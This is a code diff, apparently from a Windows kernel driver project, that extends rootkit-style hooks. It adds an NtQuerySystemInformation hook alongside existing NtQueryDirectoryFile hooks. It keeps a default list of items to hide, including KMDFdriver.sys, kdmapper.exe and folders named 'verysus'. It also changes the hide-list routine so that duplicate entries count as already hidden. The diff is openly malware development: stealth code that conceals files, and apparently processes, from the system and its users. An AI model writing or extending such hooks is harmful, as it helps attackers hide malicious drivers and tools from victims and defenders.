@@ -20,8 +20,11 @@ ULONG TextSectionSize = 0;
 // Default memory pool "arrays" to hold original data of all hooks, will include this original data + jmp afterhookaddr (shellcode itself, in 1809 format):
 PVOID OriginalNtQueryDirFile = NULL;
 PVOID OriginalNtQueryDirFileEx = NULL;
+PVOID OriginalNtQuerySystemInformation = NULL;
 PVOID ActualNtQueryDirFile = NULL;
 PVOID ActualNtQueryDirFileEx = NULL;
+PVOID ActualNtQuerySystemInformation = NULL;
+
 
 const WCHAR* DefaultFileObjs[] = { L"nosusfolder", L"verysus", L"KMDFdriver", L"MainMedium",
                                 L"MainMedium.exe", L"KMDFdriver.sys", L"kdmapper.exe",
@@ -54,6 +57,11 @@ typedef NTSTATUS(*QueryDirFileEx)(IN HANDLE FileHandle,
     FILE_INFORMATION_CLASS FileInformationClass,
     IN ULONG QueryFlags,
     IN PUNICODE_STRING FileName OPTIONAL);
+
+typedef NTSTATUS(*QuerySystemInformation)(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
+    OUT PVOID SystemInformation,
+    IN ULONG SystemInformationLength,
+    OUT PULONG ReturnLength OPTIONAL);
 
 
 // Class for handling requested files to hide:
@@ -126,7 +134,7 @@ public:
         DWORD Count = NewHideName->Length + sizeof(WCHAR);  // Length does not include nullterminator
         PVOID TempBuffer = NULL;
         if (CheckIfSameExists(NewHideName)) {
-            return FALSE;  // Path already exists
+            return TRUE;  // Path already exists, already hidden file/folder
         }
         if (HideBuffer != NULL) {
             TempBuffer = ExAllocatePoolWithTag(NonPagedPool, BufferSize, 'HfTb');
